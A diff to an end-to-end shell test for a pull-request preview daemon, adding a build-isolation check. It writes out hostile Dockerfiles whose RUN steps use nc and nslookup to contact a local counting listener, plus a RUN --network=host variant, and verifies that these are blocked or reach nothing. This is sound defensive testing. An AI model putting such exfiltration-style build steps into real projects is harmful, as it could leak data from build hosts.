@@ -12,6 +12,14 @@ DOMAIN="local.previewd"
 AGENT_PID=""
 GIT_SERVER_PID=""
 FAKE_PID=""
+EXFIL_PID=""
+# E2E_BUILDKIT_CGROUP: the cgroup v2 subtree bounding BuildKit builds on this
+# host (PREVIEWD_BUILDKIT_CGROUP). Unset: PREVIEWD_ALLOW_UNBOUNDED_BUILDS=1,
+# accepted by the daemon and logged as an error (dev hosts, cgroup v1); the
+# startup build probe still proves the build network is off.
+E2E_BUILDKIT_CGROUP="${E2E_BUILDKIT_CGROUP:-}"
+ALLOW_UNBOUNDED=""
+[ -n "$E2E_BUILDKIT_CGROUP" ] || ALLOW_UNBOUNDED=1
 PKI_DIR=""
 # The daemon's webhook listener is TLS (C2); the fake GHES (C3) serves the
 # GitHub App API on loopback with the same test CA.
@@ -88,6 +96,7 @@ cleanup() {
   if [ -n "$AGENT_PID" ]; then kill -SIGTERM "$AGENT_PID" 2>/dev/null || true; fi
   if [ -n "$GIT_SERVER_PID" ]; then kill -SIGTERM "$GIT_SERVER_PID" 2>/dev/null || true; fi
   if [ -n "$FAKE_PID" ]; then kill -SIGTERM "$FAKE_PID" 2>/dev/null || true; fi
+  if [ -n "$EXFIL_PID" ]; then kill -SIGTERM "$EXFIL_PID" 2>/dev/null || true; fi
 
   cd "$PROJECT_ROOT"
   PREVIEWD_ROUTES_DIR="$ROUTES_DIR" make docker-down >/dev/null 2>&1 || true
@@ -233,12 +242,14 @@ start_agent() {
     PREVIEWD_WEBHOOK_ALLOWED_CIDRS=127.0.0.0/8,::1/128 \
     PREVIEWD_APPROVERS=e2e/mock:e2e-approver#7 \
     PREVIEWD_ALLOWED_BASE_IMAGES="$E2E_BASE" \
+    PREVIEWD_BUILDKIT_CGROUP="$E2E_BUILDKIT_CGROUP" \
+    PREVIEWD_ALLOW_UNBOUNDED_BUILDS="$ALLOW_UNBOUNDED" \
     PREVIEWD_APPROVAL_REVALIDATE_INTERVAL=1m \
     PREVIEWD_APPROVAL_REVALIDATE_GRACE=1m \
     CREDENTIALS_DIRECTORY="$CREDS_DIR" \
     ./bin/previewd >>"$MOCK_DIR/agent.log" 2>&1 &
   AGENT_PID=$!
-  wait_for 30 "the agent to serve" agent_curl -sf "$AGENT_URL/healthz"
+  wait_for 60 "the agent to serve" agent_curl -sf "$AGENT_URL/healthz"
 }
 
 echo "==> Starting previewd agent in background..."
@@ -433,6 +444,87 @@ case "$ledger" in *'"live":0'*) ;; *) fail "a token is still live: $ledger" ;; e
 case "$ledger" in *'"misuse":null'*) ;; *) fail "a token was misused: $ledger" ;; esac
 case "$ledger" in *'contents'*|*':write'*) fail "a token carried more than read on pull requests: $ledger" ;; esac
 echo "    ok: trusted and untrusted judged from GHES; $minted tokens, each scoped to e2e/mock, read-only, revoked"
+
+echo "==> 2h. Build isolation (E2b, E3): startup probe, exfiltration attempts reach nothing, RUN --network=host refused..."
+# E2b: the daemon refused to serve unless its startup build probe passed.
+grep -q '"msg":"Startup build probe passed"' "$MOCK_DIR/agent.log" || fail "no startup build probe in the agent log"
+[ "$(grep -c '"msg":"Startup build probe passed"' "$MOCK_DIR/agent.log")" -ge 2 ] || fail "the restart did not run the build probe again"
+if docker image inspect previewd-build-probe:latest >/dev/null 2>&1; then fail "the probe image was left behind"; fi
+# E3: a listener on the host bridge counts TCP connections and DNS queries.
+go build -tags e2e -o "$MOCK_DIR/exfil" ./test/e2e/exfil
+EXFIL_DIR="$MOCK_DIR/exfil-counts"
+mkdir -p "$EXFIL_DIR" "$MOCK_DIR/exfil-ctx"
+GW=$(docker network inspect bridge -f '{{(index .IPAM.Config 0).Gateway}}')
+"$MOCK_DIR/exfil" listen -addr "$GW" -dir "$EXFIL_DIR" >>"$MOCK_DIR/exfil.log" 2>&1 &
+EXFIL_PID=$!
+wait_for 10 "the exfiltration listener" test -s "$EXFIL_DIR/port"
+EXFIL_PORT=$(cat "$EXFIL_DIR/port")
+exfil_count() { cat "$EXFIL_DIR/$1"; }
+# The hostile RUN: a TCP connection and a DNS query to the listener, then a
+# record of its interfaces; it never fails, so the image can be inspected.
+EXFIL_DOCKERFILE=$(printf 'FROM %s\nRUN nc -w 3 %s %s </dev/null; nslookup -timeout=2 exfil.previewd.invalid %s:%s; cat /proc/net/dev > /netdev; true\nRUN mkdir /www && echo previewd-e2e-ok > /www/index.html\nCMD ["sh", "-c", "exec httpd -f -p 8080 -h /www"]\n' "$E2E_BASE" "$GW" "$EXFIL_PORT" "$GW" "$EXFIL_PORT")
+printf '%s' "$EXFIL_DOCKERFILE" > "$MOCK_DIR/exfil-ctx/Dockerfile"
+# The control: the same Dockerfile built on the engine's default network by
+# the test fixture (e2e tag), never by previewd. It must reach the listener.
+"$MOCK_DIR/exfil" control-build -context "$MOCK_DIR/exfil-ctx" -tag previewd-e2e-exfil-control:latest \
+  || fail "the control build failed"
+[ "$(exfil_count tcp)" -ge 1 ] && [ "$(exfil_count udp)" -ge 1 ] \
+  || fail "the control build reached nothing (tcp $(exfil_count tcp), udp $(exfil_count udp)): the exfiltration checks would prove nothing"
+CONTROL_TCP=$(exfil_count tcp)
+CONTROL_UDP=$(exfil_count udp)
+echo "    ok: control build without isolation reached the listener (tcp $CONTROL_TCP, dns $CONTROL_UDP)"
+
+cd "$MOCK_DIR/src"
+git checkout -q -b e2e/exfil "$MOCK_SHA"
+printf '%s' "$EXFIL_DOCKERFILE" > Dockerfile
+git commit -q -am "exfiltration attempt"
+git push -q origin e2e/exfil
+EXFIL_SHA=$(git rev-parse HEAD)
+git checkout -q -b e2e/nethost "$MOCK_SHA"
+printf 'FROM %s\nRUN --network=host nc -w 3 %s %s </dev/null\n' "$E2E_BASE" "$GW" "$EXFIL_PORT" > Dockerfile
+git commit -q -am "RUN --network=host"
+git push -q origin e2e/nethost
+NETHOST_SHA=$(git rev-parse HEAD)
+git checkout -q "$MOCK_SHA"
+cd "$PROJECT_ROOT"
+
+# E3_PR_BODY ACTION NUMBER REF SHA: a same-repository PR by the writer opener.
+E3_PR_BODY() {
+  printf '{"action":"%s","number":%d,"pull_request":{"number":%d,"head":{"ref":"%s","sha":"%s","repo":{"full_name":"e2e/mock"}},"user":{"login":"e2e-opener","id":4242},"updated_at":"%s"},"repository":{"full_name":"e2e/mock","clone_url":"file://%s/mock.git"},"sender":{"login":"e2e-opener","id":4242}}' \
+    "$1" "$2" "$2" "$3" "$4" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$MOCK_DIR"
+}
+# deploy_outcome ENV: the agent's outcome line for ENV, once there is one.
+deploy_outcome() { grep -E '"msg":"(Environment deployed|Deploy failed, rolling back)"' "$MOCK_DIR/agent.log" | grep "\"environment_id\":\"$1\""; }
+
+fake_put pulls/e2e/mock/1003 "{\"state\":\"open\",\"head_sha\":\"$EXFIL_SHA\",\"head_repo\":\"e2e/mock\",\"opener\":{\"login\":\"e2e-opener\",\"id\":4242}}"
+reply=$(send_webhook pull_request "$(E3_PR_BODY opened 1003 e2e/exfil "$EXFIL_SHA")")
+EXFIL_ENV=$(printf '%s' "$reply" | sed -n 's/.*"environment_id":"\([a-z0-9-]*\)".*/\1/p')
+[ -n "$EXFIL_ENV" ] || fail "no environment_id for the exfiltration PR: $reply"
+wait_for 120 "the exfiltration deploy to finish" deploy_outcome "$EXFIL_ENV"
+[ "$(exfil_count tcp)" = "$CONTROL_TCP" ] && [ "$(exfil_count udp)" = "$CONTROL_UDP" ] \
+  || fail "the PR build reached the listener (tcp $CONTROL_TCP -> $(exfil_count tcp), dns $CONTROL_UDP -> $(exfil_count udp))"
+if deploy_outcome "$EXFIL_ENV" | grep -q '"msg":"Environment deployed"'; then
+  ifaces=$(docker run --rm --network none --entrypoint cat "$EXFIL_ENV:latest" /netdev | awk -F: 'NR > 2 { gsub(/ /, "", $1); print $1 }' | sort | tr '\n' ' ')
+  [ "$ifaces" = "lo " ] || fail "the PR's RUN saw interfaces: $ifaces"
+  echo "    ok: PR build ran, its RUN saw lo only, the listener got nothing"
+else
+  echo "    ok: PR build failed, the listener got nothing"
+fi
+send_webhook pull_request "$(E3_PR_BODY closed 1003 e2e/exfil "$EXFIL_SHA")" >/dev/null
+wait_for 60 "teardown of $EXFIL_ENV" sh -c "! docker inspect '$EXFIL_ENV' && ! docker image inspect '$EXFIL_ENV:latest' && [ ! -e '$ROUTES_DIR/$EXFIL_ENV.yml' ]"
+
+fake_put pulls/e2e/mock/1004 "{\"state\":\"open\",\"head_sha\":\"$NETHOST_SHA\",\"head_repo\":\"e2e/mock\",\"opener\":{\"login\":\"e2e-opener\",\"id\":4242}}"
+reply=$(send_webhook pull_request "$(E3_PR_BODY opened 1004 e2e/nethost "$NETHOST_SHA")")
+NETHOST_ENV=$(printf '%s' "$reply" | sed -n 's/.*"environment_id":"\([a-z0-9-]*\)".*/\1/p')
+[ -n "$NETHOST_ENV" ] || fail "no environment_id for the RUN --network=host PR: $reply"
+wait_for 60 "the RUN --network=host deploy to fail" deploy_outcome "$NETHOST_ENV"
+deploy_outcome "$NETHOST_ENV" | grep -q 'build refused by preflight' \
+  || fail "RUN --network=host not refused by the preflight: $(deploy_outcome "$NETHOST_ENV" | head -c 400)"
+if docker image inspect "$NETHOST_ENV:latest" >/dev/null 2>&1; then fail "an image was built for RUN --network=host"; fi
+[ "$(exfil_count tcp)" = "$CONTROL_TCP" ] || fail "the RUN --network=host PR reached the listener"
+echo "    ok: RUN --network=host refused by the preflight before any build request; no image"
+kill -SIGTERM "$EXFIL_PID" 2>/dev/null || true
+EXFIL_PID=""
 
 echo "==> 3. Testing Exhaustive Teardown (Action: closed)..."
 case "$(send_webhook pull_request "$(PR_BODY closed)")" in
